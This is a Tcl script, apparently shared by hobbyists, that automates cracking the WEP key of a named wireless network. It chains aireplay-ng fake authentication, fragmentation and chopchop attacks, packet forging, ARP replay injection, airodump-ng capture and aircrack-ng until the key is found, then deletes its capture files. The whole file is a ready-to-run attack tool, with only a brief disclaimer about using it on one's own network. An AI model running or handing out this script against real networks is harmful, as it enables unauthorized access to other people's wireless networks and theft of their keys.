#!/usr/bin/tclsh
#
# Based upon by GM
# Last modified by Jano, compatible with Aircack-ng 1.1 and latest SVN
# Modifies by Rusty73, compatible with Ubuntu 9.10 and 10.04
# ... Enjoy ;)

#################################################################
#                      Disclaimer:                              #
# I am not responsible if this script gets you in legal trouble #
#         Test it only in Your wireless connection              #     
#################################################################

#######################################################
# Note for use --> sudo ./ws2.tcl Essid Iface Channel #
#######################################################

set essid "\"[join [lrange [split $argv] 0 end-2]]\""
set iface [lindex [split $argv] end-1]
set channel [lindex [split $argv] end]
exec iwconfig $iface channel $channel
set debug 1

if {$debug} {
	puts "Essid: $essid\nIface: $iface\nChannel: $channel"
}

proc unblock {channel} {
	fconfigure $channel -buffering none -blocking 0 
	return $channel
}

proc do_auth {essid iface} {	
	set assoc [open "|/usr/sbin/aireplay-ng -1 600 -e $essid $iface"]
	return [unblock $assoc]
}

proc check_auth {assoc} {
	set prevline ""
	while {[set curline [gets $assoc]] != ""} {
		if {$::debug} {puts $curline}
		if {[string match "*Association successful*" $curline]} {
			puts "Associated successfully."
			set ::authed 1			
		} elseif {[regexp {Using the device MAC \((.+?)\)} $curline tmp ::hmac]} {
			puts "Device MAC $::hmac"
		} elseif {[regexp {Found BSSID "(.+?)"} $curline tmp ::bmac]} {
			puts "AP MAC $::bmac"
		}
	}
}

proc do_chop {essid iface} {
	puts "Running chopchop attack..."
	set chop [open "|/usr/sbin/aireplay-ng -4 -F -h $::hmac -e $essid $iface" r+]
	return [unblock $chop]
}

proc do_frag {essid iface} {
	puts "Running fragmentation attack..."
	set frag [open "|/usr/sbin/aireplay-ng -5 -F -e $essid $iface" r+]
	return [unblock $frag]
}

proc check_gen {frag} {
	while {[set curline [gets $frag]] != ""} {
		if {$::debug} {puts $curline}
		if {[regexp -line {^Saving keystream in (.+?)$} $curline tmp filename]} {
			return $filename
		} elseif {[string match "Still nothing*" $curline]} {
			puts $frag "n\n"
			flush $frag
		}
	}
	return 0
}

proc make_packet {xor} {
	catch {exec packetforge-ng -0 -a $::bmac -h $::hmac -k 192.168.1.100 -l 192.168.1.101 -y $xor -w arp-request}
}

proc do_inj {iface essid} {
	set inj [open "|/usr/sbin/aireplay-ng -3 -r arp-request -e $essid -F $iface"]
	puts "Injecting generated packet..."
	return [unblock $inj]
}

proc do_arpinj {iface essid} {
	set inj [open "|/usr/sbin/aireplay-ng -3 -e $essid -F $iface -x 700"]
	puts "Listening for ARP packets..."
	return [unblock $inj]
}

proc check_arpinj {arpinj frag chop} {
	while {[set curline [gets $arpinj]] != ""} {
		if {$::debug} {puts $curline}
		if {!$::replaystarted && [regexp -line {^Read \d+ packets} $curline] && ![regexp {got 0 ARP requests} $curline]} {
			puts "Replaying ARP packets."
			catch {exec kill -9 [pid $frag]} tmp
			catch {exec kill -9 [pid $chop]} tmp
			catch {exec kill -9 [pid $::inj]} tmp
			set ::replaystarted 1
			return 1
		}
	}
	return 0
}

proc do_dump {iface chan} {
	puts "Packet capture started."
	set aero [open "|/usr/sbin/airodump-ng --channel $chan -w temp $iface"]
	return [unblock $aero]
}

proc do_crack {essid} {
	puts "Starting crack..."
	after 500
	set ac [open "|/usr/bin/aircrack-ng -q -l $essid -e $essid -b $::bmac [pwd]/temp-01.cap"]
	return [unblock $ac]
}

proc check_crack {ac} {
	while {[set curline [gets $ac]] != ""} {
		if {$::debug} {puts $curline}
		if {[regexp -line {^KEY FOUND.+?$} $curline key]} {
			puts $key
			return 1
		}
	}
	return 0
}

proc do_cleanup {} {
	puts "Write Key to file and cleaning up..."
	eval file delete [glob *.cap]
	catch {eval file delete [glob *.xor]}
	file delete temp-01.csv
	file delete temp-01.kismet.csv
	file delete temp-01.kismet.netxml
	file delete arp-request
}

set time [clock seconds]
set authstarted 0
set authed 0
set fragstarted 0
set fragged 0
set forged 0
set injecting 0
set airodump 0
set aircrack 0
set arpinjstarted 0
set finished 0
set replaystarted 0
set inj ""

while {true} {
	if {!$authstarted} {
		set assoc [do_auth $essid $iface]
		set authstarted 1
	}
	check_auth $assoc
	
	if {!$fragstarted && $authed} {
		set frag [do_frag $essid $iface]
		set chop [do_chop $essid $iface]
		set arpinj [do_arpinj $iface $essid]
		set fragstarted 1
		set arpinjstarted 1
	}

	if {$arpinjstarted} {
		set cur [check_arpinj $arpinj $frag $chop]
		if {!$injecting && $cur} {
			set injecting $cur
		}
	}

	if {$fragstarted && !$fragged && !$injecting} {
		if {[set xor [check_gen $frag]] != 0 || [set xor [check_gen $chop]] != 0} {
			puts "Got keystream..."
			set fragged 1
		}
	}

	if {$fragged && !$forged && !$injecting} {
		make_packet $xor
		set forged 1
	}

	if {$forged && !$injecting} {
		set inj [do_inj $iface $essid]
		set injecting 1
	}

	if {$injecting && !$airodump} {
		file delete temp-01.cap
		file delete temp-01.csv
		file delete temp-01.kismet.csv
		file delete temp-01.kismet.netxml
		set dump [do_dump $iface $channel]
		set airodump 1
	}

	if {$airodump && !$aircrack && [file exist [pwd]/temp-01.cap]} {
		set ac [do_crack $essid]
		set aircrack 1
	}

	if {$aircrack} {
		set finished [check_crack $ac]
	}

	if {$finished} {
		do_cleanup
		catch {exec kill [pid $dump]} tmp
		catch {exec killall aireplay-ng} tmp
		break
	}
	after 10
}
puts "Time taken: [expr [clock seconds] - $time] seconds"
exit
